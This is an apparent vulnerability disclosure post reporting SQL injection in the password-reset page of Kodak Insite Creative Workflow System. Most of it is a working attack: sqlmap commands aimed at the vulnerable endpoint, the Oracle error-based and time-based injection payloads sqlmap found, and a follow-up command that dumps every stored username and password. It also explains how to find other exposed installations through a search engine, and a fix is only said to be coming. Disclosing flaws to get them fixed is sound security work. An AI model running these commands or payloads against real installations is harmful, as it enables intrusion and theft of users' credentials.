Subject: SQLi found in Kodak Insite

Hello ...

While investigating a recent installation of Kodak's Insite Creative
Workflow System (for my current employer), an SQL Injection vulnerability
was discovered in its "Forgot Your Password?" page.

An example of this application can be seen on the Kodak site.

   https://creativeworkflow.kodak.com/TwAmWeb/login.asp

Many other copies of Kodak Insite can be located with any search engine
by looking for the string "insite creative login".

Our installation was setup on an internal site, and as such, SQLMAP was
applied to our local copy, as follows.

sqlmap.py -u 'http://localhost/TwAmWeb/EmailPassword.asp'
--data='user_name=1&Language=en' -p user_name --risk=3 --level=5 -o

sqlmap identified the following injection points with a total of 163
HTTP(s) requests:
    ---
    Place: POST
    Parameter: user_name
        Type: error-based
        Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)
        Payload: user_name=1') AND 5065=(SELECT
UPPER(XMLType(CHR(60)||CHR(58)||CHR(118)||CHR(110)||CHR(101)||CHR(58)||(SELECT
(CASE WHEN (5065=5065) THEN 1 ELSE 0
    END) FROM
DUAL)||CHR(58)||CHR(116)||CHR(121)||CHR(112)||CHR(58)||CHR(62))) FROM
DUAL) AND ('yCTb'='yCTb&Language=en

        Type: AND/OR time-based blind
        Title: Oracle OR time-based blind
        Payload: user_name=-2979') OR
1635=DBMS_PIPE.RECEIVE_MESSAGE(CHR(76)||CHR(80)||CHR(114)||CHR(122),5)
AND ('NjHU'='NjHU&Language=en
    ---
    [11:52:56] [INFO] the back-end DBMS is Oracle
    web server operating system: Windows 2003
    web application technology: ASP.NET, Microsoft IIS 6.0, ASP
    back-end DBMS: Oracle
    [11:52:56] [WARNING] HTTP error codes detected during testing:
    500 (Internal Server Error) - 44 times

A little fishing around and it becomes obvious that all usernames/passwords
can be downloaded like this:

sqlmap.py -u 'http://localhost/TwAmWeb/EmailPassword.asp'
--data='user_name=1&Language=en' --risk=3 --level=5 -o -D PRINERGY -T
DBCS_REMOTEUSER --columns --dump

Supposedly Kodak will be releasing a fix in September.
